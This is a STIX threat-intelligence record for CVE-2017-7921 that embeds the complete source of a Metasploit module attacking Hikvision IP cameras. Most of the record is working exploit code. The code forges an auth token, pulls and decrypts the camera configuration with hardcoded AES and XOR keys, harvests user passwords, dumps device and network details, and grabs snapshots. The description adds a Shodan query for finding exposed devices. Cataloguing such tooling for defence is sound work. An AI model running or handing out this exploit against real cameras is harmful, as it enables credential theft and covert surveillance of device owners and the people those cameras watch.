{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--429b9089-e71e-4713-a437-c0d04cc6b798",
    "created": "2024-08-14T16:31:50.874453Z",
    "modified": "2024-08-14T16:31:50.874457Z",
    "name": "Unauthenticated information disclosure such as configuration, credentials and camera snapshots of a vulnerable Hikvision IP Camera",
    "description": " Many Hikvision IP cameras have improper authorization logic that allows unauthenticated information disclosure of camera information such as detailed hardware and software configuration, user credentials, and camera snapshots. The vulnerability has been present in Hikvision products since 2014. In addition to Hikvision-branded devices, it affects many white-labeled camera products sold under a variety of brand names. Hundreds of thousands of vulnerable devices are still exposed to the Internet at the time of publishing (shodan search: \"App-webs\" \"200 OK\"). This module allows the attacker to retrieve this information without any authentication. The information is stored in loot for future use.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/hikvision_info_disclosure_cve_2017_7921.rb",
            "external_id": "hikvision_info_disclosure_cve_2017_7921.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-7921"
        },
        {
            "source_name": "reference",
            "url": "https://ipvm.com/reports/hik-exploit"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/PlLehGSmxT/cve-2017-7921"
        },
        {
            "source_name": "reference",
            "url": "http://seclists.org/fulldisclosure/2017/Sep/23"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  require 'openssl'\n\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  # AES hex encryption key and XOR key defined constants used to decrypt the camare configuration file\n  AES_KEY = '279977f62f6cfd2d91cd75b889ce0c9a'.freeze\n  XOR_KEY = \"\\x73\\x8b\\x55\\x44\".freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Unauthenticated information disclosure such as configuration, credentials and camera snapshots of a vulnerable Hikvision IP Camera',\n        'Description' => %q{\n          Many Hikvision IP cameras have improper authorization logic that allows unauthenticated information disclosure of camera information,\n          such as detailed hardware and software configuration, user credentials, and camera snapshots.\n          The vulnerability has been present in Hikvision products since 2014.\n          In addition to Hikvision-branded devices, it affects many white-labeled camera products sold under a variety of brand names.\n          Hundreds of thousands of vulnerable devices are still exposed to the Internet at the time of publishing (shodan search: \"App-webs\" \"200 OK\").\n          This module allows the attacker to retrieve this information without any authentication. The information is stored in loot for future use.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Monte Crypto', # Researcher who discovered and disclosed this vulnerability\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # Developer and author of this Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2017-7921' ],\n          [ 'PACKETSTORM', '144097' ],\n          [ 'URL', 'https://ipvm.com/reports/hik-exploit' ],\n          [ 'URL', 'https://attackerkb.com/topics/PlLehGSmxT/cve-2017-7921' ],\n          [ 'URL', 'http://seclists.org/fulldisclosure/2017/Sep/23' ]\n        ],\n        'Actions' => [\n          ['Automatic', { 'Description' => 'Dump all information' }],\n          ['Credentials', { 'Description' => 'Dump all credentials and passwords' }],\n          ['Configuration', { 'Description' => 'Dump camera hardware and software configuration' }],\n          ['Snapshot', { 'Description' => 'Take a camera snapshot' }]\n        ],\n        'DefaultAction' => 'Automatic',\n        'DefaultOptions' => {\n          'RPORT' => 80,\n          'SSL' => false\n        },\n        'DisclosureDate' => '2017-09-23',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      OptBool.new(\n        'PRINT',\n        [\n          false,\n          'Print output to console (not applicable for snapshot)',\n          true\n        ]\n      )\n    ])\n  end\n\n  def get_info(uri)\n    password = Rex::Text.rand_text_alphanumeric(4..12)\n    auth = Base64.urlsafe_encode64(\"admin:#{password}\", padding: false)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => uri,\n      'vars_get' => {\n        'auth' => auth.strip\n      }\n    })\n    return res\n  rescue StandardError => e\n    print_error(\"#{peer} - Communication error occurred: #{e.message}\")\n    elog(\"#{peer} - Communication error occurred: #{e.message}\", error: e)\n    return nil\n  end\n\n  def report_creds(user, pwd)\n    credential_data = {\n      module_fullname: fullname,\n      username: user,\n      private_data: pwd,\n      private_type: :password,\n      workspace_id: myworkspace_id,\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_details)\n\n    cred_res = create_credential_and_login(credential_data)\n    unless cred_res.nil?\n      print_status(\"Credentials for user:#{user} are added to the database...\")\n    end\n  end\n\n  def decrypt_config\n    text_data = []\n\n    # Get AES128-ECB encrypted camera configuration file with user and password information\n    uri = normalize_uri(target_uri.path, 'System', 'configurationFile')\n    aes_data = get_info(uri)\n\n    if aes_data.nil?\n      print_error('Target server did not respond to the configuration file download request.')\n    elsif aes_data.code == 200\n      # decrypt configuration file data with the weak AES128-ECB encryption hex key: 279977f62f6cfd2d91cd75b889ce0c9a\n      decipher = OpenSSL::Cipher.new('aes-128-ecb')\n      decipher.decrypt\n      decipher.key = [AES_KEY].pack('H*') # transform hex key to 16 bits key\n      xor_data = decipher.update(aes_data.body) + decipher.final\n\n      # decode the AES decrypted configuration file data with xor key: 73 8B 55 44\n      file_data = Rex::Text.xor(XOR_KEY.b, xor_data)\n\n      # extract text chunks with regular expression below...\n      text_data = file_data.scan(%r{[0-9A-Za-z_\\#~`@|\\\\/=*\\^:\"'.;{}?\\-+&!$%()\\[\\]<>]+}x)\n    end\n    return text_data\n  end\n\n  def get_creds\n    loot_data = ''\n    pwd = nil\n\n    print_status('Getting the user credentials...')\n    uri = normalize_uri(target_uri.path, 'Security', 'users')\n    creds_info = get_info(uri)\n\n    if creds_info.nil?\n      print_error('Target server did not respond to the credentials request.')\n    elsif creds_info.code == 200\n      # process XML output and store output in loot_data\n      xml_creds_info = creds_info.get_xml_document\n      if xml_creds_info.blank?\n        print_error('No users were found in the returned CSS code!')\n      else\n        # Download camera configuration file and and decrypt\n        text_data = decrypt_config\n        loot_data << \"User Credentials Information:\\n\"\n        loot_data << \"-----------------------------\\n\"\n        xml_creds_info.css('User').each do |user|\n          unless text_data.empty?\n            # Filter out password based on user name and store credentials in the database\n            i = text_data.each_with_index.select { |text_chunk, _index| text_chunk == user.at_css('userName').content }.map { |pair| pair[1] }\n            if i.empty?\n              print_error(\"Could not retrieve password for user:#{user.at_css('userName').content} from the camera configuration file!\")\n            else\n              pwd = text_data[i.last + 1]\n              report_creds(user.at_css('userName').content, pwd)\n            end\n          end\n          loot_data << \"User:#{user.at_css('userName').content} | ID:#{user.at_css('id').content} | Role:#{user.at_css('userLevel').content} | Password: #{pwd}\\n\"\n        end\n      end\n    else\n      print_error('Response code invalid for obtaining the user credentials.')\n    end\n    unless loot_data.empty?\n      if datastore['PRINT']\n        print_status(loot_data.to_s)\n      end\n      loot_path = store_loot('hikvision.credential', 'text/plain', datastore['RHOSTS'], loot_data, 'credentials', 'leaked credentials')\n      print_good(\"User credentials are successfully saved to #{loot_path}\")\n    end\n  end\n\n  def get_config\n    loot_data = ''\n\n    # Get device info\n    print_status('Getting the camera hardware and software configuration...')\n    uri = normalize_uri(target_uri.path, 'System', 'deviceInfo')\n    device_info = get_info(uri)\n\n    if device_info.nil?\n      print_error('Target server did not respond to the device info request.')\n    elsif device_info.code == 200\n      # process XML output and store in loot_data\n      xml_device_info = device_info.get_xml_document\n      if xml_device_info.blank?\n        print_error('No device info was found in the returned CSS code!')\n      else\n        loot_data << \"Camera Device Information:\\n\"\n        loot_data << \"--------------------------\\n\"\n        xml_device_info.css('DeviceInfo').each do |device|\n          loot_data << \"Device name: #{device.at_css('deviceName').content}\\n\"\n          loot_data << \"Device ID: #{device.at_css('deviceID').content}\\n\"\n          loot_data << \"Device description: #{device.at_css('deviceDescription').content}\\n\"\n          loot_data << \"Device manufacturer: #{device.at_css('systemContact').content}\\n\"\n          loot_data << \"Device model: #{device.at_css('model').content}\\n\"\n          loot_data << \"Device S/N: #{device.at_css('serialNumber').content}\\n\"\n          loot_data << \"Device MAC: #{device.at_css('macAddress').content}\\n\"\n          loot_data << \"Device firware version: #{device.at_css('firmwareVersion').content}\\n\"\n          loot_data << \"Device firmware release: #{device.at_css('firmwareReleasedDate').content}\\n\"\n          loot_data << \"Device boot version: #{device.at_css('bootVersion').content}\\n\"\n          loot_data << \"Device boot release: #{device.at_css('bootReleasedDate').content}\\n\"\n          loot_data << \"Device hardware version: #{device.at_css('hardwareVersion').content}\\n\"\n        end\n        loot_data << \"\\n\"\n      end\n    else\n      print_error('Response code invalid for obtaining camera hardware and software configuration.')\n    end\n\n    # Get network configuration\n    uri = normalize_uri(target_uri.path, 'Network', 'interfaces')\n    network_info = get_info(uri)\n\n    if network_info.nil?\n      print_error('Target server did not respond to the network info request.')\n    elsif network_info.code == 200\n      # process XML output and store in loot_data\n      xml_network_info = network_info.get_xml_document\n      if xml_network_info.blank?\n        print_error('No network info was found in the returned CSS code!')\n      else\n        loot_data << \"Camera Network Information:\\n\"\n        loot_data << \"---------------------------\\n\"\n        xml_network_info.css('NetworkInterface').each do |interface|\n          loot_data << \"IP interface: #{interface.at_css('id').content}\\n\"\n          xml_network_info.css('IPAddress').each do |ip|\n            loot_data << \"IP version: #{ip.at_css('ipVersion').content}\\n\"\n            loot_data << \"IP assignment: #{ip.at_css('addressingType').content}\\n\"\n            loot_data << \"IP address: #{ip.at_css('ipAddress').content}\\n\"\n            loot_data << \"IP subnet mask: #{ip.at_css('subnetMask').content}\\n\"\n            xml_network_info.css('DefaultGateway').each do |gateway|\n              loot_data << \"Default gateway: #{gateway.at_css('ipAddress').content}\\n\"\n            end\n            xml_network_info.css('PrimaryDNS').each do |dns|\n              loot_data << \"Primary DNS: #{dns.at_css('ipAddress').content}\\n\"\n            end\n          end\n        end\n        loot_data << \"\\n\"\n      end\n    else\n      print_error('Response code invalid for obtaining camera network configuration.')\n    end\n\n    # Get storage configuration\n    uri = normalize_uri(target_uri.path, 'System', 'Storage', 'volumes')\n    storage_info = get_info(uri)\n\n    if storage_info.nil?\n      print_error('Target server did not respond to the storage info request.')\n    elsif storage_info.code == 200\n      # process XML output and store in loot\n      xml_storage_info = storage_info.get_xml_document\n      if xml_storage_info.blank?\n        print_error('No storage info was found in the returned CSS code!')\n      else\n        loot_data << \"Camera Storage Information:\\n\"\n        loot_data << \"---------------------------\\n\"\n        xml_storage_info.css('StorageVolume').each do |volume|\n          loot_data << \"Storage volume name: #{volume.at_css('volumeName').content}\\n\"\n          loot_data << \"Storage volume ID: #{volume.at_css('id').content}\\n\"\n          loot_data << \"Storage volume description: #{volume.at_css('storageDescription').content}\\n\"\n          loot_data << \"Storage device: #{volume.at_css('storageLocation').content}\\n\"\n          loot_data << \"Storage type: #{volume.at_css('storageType').content}\\n\"\n          loot_data << \"Storage capacity (MB): #{volume.at_css('capacity').content}\\n\"\n          loot_data << \"Storage device status: #{volume.at_css('status').content}\\n\"\n        end\n      end\n    else\n      print_error('Response code invalid for obtaining camera storage configuration.')\n    end\n    unless loot_data.empty?\n      if datastore['PRINT']\n        print_status(loot_data.to_s)\n      end\n      loot_path = store_loot('hikvision.config', 'text/plain', datastore['RHOSTS'], loot_data, 'configuration', 'camera configuration')\n      print_good(\"Camera configuration details are successfully saved to #{loot_path}\")\n    end\n  end\n\n  def take_snapshot\n    jpeg_image = nil\n\n    # Take a snapshot and store as jpeg\n    print_status('Taking a camera snapshot...')\n    uri = normalize_uri(target_uri.path, 'Streaming', 'channels', '1', 'picture?snapShotImageType=JPEG')\n    res = get_info(uri)\n\n    if res.nil?\n      print_error('Target server did not respond to the snapshot request.')\n    elsif res.code == 200\n      jpeg_image = res.body\n    else\n      print_error('Response code invalid for obtaining a camera snapshot.')\n    end\n    unless jpeg_image.nil?\n      loot_path = store_loot('hikvision.image', 'jpeg/image', datastore['RHOSTS'], jpeg_image, 'snapshot', 'camera snapshot')\n      print_good(\"Camera snapshot is successfully saved to #{loot_path}\")\n    end\n  end\n\n  def check\n    uri = normalize_uri(target_uri.path, 'System', 'time')\n    res = get_info(uri)\n\n    if res.nil?\n      return Exploit::CheckCode::Unknown\n    elsif res.code == 200\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def run\n    case action.name\n    when 'Automatic'\n      print_status('Running in automatic mode')\n      get_creds\n      get_config\n      take_snapshot\n    when 'Credentials'\n      get_creds\n    when 'Configuration'\n      get_config\n    when 'Snapshot'\n      take_snapshot\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-09-23"
}